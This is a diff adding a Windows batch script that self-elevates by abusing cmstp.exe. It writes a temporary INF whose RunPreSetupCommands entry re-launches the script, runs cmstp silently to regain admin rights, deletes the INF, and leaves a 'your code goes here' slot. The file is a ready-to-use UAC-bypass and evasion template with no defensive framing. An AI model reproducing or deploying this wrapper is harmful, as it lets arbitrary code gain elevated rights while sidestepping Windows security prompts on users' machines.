@@ -1,0 +1,38 @@
+@echo off
+:: SELF ELEVATING SCRIPT USING ELEVATECMSTP
+
+net session >nul 2>&1
+if %errorlevel% == 0 (
+    echo.
+    echo ============================================
+    echo   This CMD is running with Administrator permissions.
+    echo ============================================
+    echo.
+    pause
+    goto main
+)
+
+:: Create temp INF for CMSTP
+set "inf=%temp%\elev.inf"
+(
+echo [version]
+echo Signature=$chicago$
+echo AdvancedINF=2.5
+echo [DefaultInstall]
+echo RunPreSetupCommands=CommandSection
+echo [CommandSection]
+echo "%~f0"
+echo [Strings]
+echo ServiceName="Elevation"
+) > "%inf%"
+
+start "" "%SystemRoot%\System32\cmstp.exe" /s "%inf%"
+timeout /t 2 >nul 2>&1
+del "%inf%" >nul 2>&1
+
+echo [INFO] Relaunching with admin rights...
+exit /b
+
+:main
+:: your code goes here
+pause
